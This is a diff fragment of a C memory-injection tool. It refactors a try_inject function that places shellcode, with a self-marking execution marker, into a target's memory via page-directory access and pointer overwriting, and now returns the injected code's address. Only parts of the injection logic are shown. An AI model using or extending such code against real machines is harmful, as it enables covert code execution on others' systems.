@@ -53,7 +53,8 @@ char pagedir[4096];
 // values of aggressiveness:
 // 	 & 1: write (but only at locations that are pointers into the binary)
 // 	 & 2: also try anywhere that may be a pointer to 0x08~~~~~~ or 0xb7~~~~~~ (does not write if not &1)
-uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int codelen, int aggressiveness)
+// return virtual address of injected code.
+uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int injectcodelen, int aggressiveness)
 {{{
 	// i386-code that marks itself when being executed:
 	//
@@ -90,6 +91,7 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int cod
 	addr_t code_location;
 	addr_t mark_location;
 	char*code;
+	int codelen;
 	char page[4096];
 
 	printf("\t" TERM_BLUE"aggressiveness: %s, %s" TERM_RESET "\n",
@@ -99,10 +101,10 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int cod
 
 	// we attach a self-changing marker to the shellcode. this way we can test,
 	// if the shellcode has been executed, yet.
-	code = malloc(codelen + MARKER_LEN + 1);
+	codelen = MARKER_LEN + injectcodelen;
+	code = malloc(codelen + 1);
 	memcpy(code, marker, MARKER_LEN);
-	memcpy(code + MARKER_LEN, injectcode, codelen);
-	codelen += MARKER_LEN;
+	memcpy(code + MARKER_LEN, injectcode, injectcodelen);
 
 	// seek the stack-page with environment and stuff
 	stack_bottom = linear_seek_mapped_page(lin, 0xbffff, 0x1000, -1);
@@ -217,6 +219,8 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int cod
 	printf("\t* mark is 0x%08x\n",mark_value);
 	linear_read(lin, mark_location + ( ESP_OFFSET - MARK_OFFSET ), &mark_value, 4);
 	printf("\t* ESP was 0x%08x\n",mark_value);
+
+	return code_location + MARKER_LEN;
 }}}
 
 void usage(char* argv0)
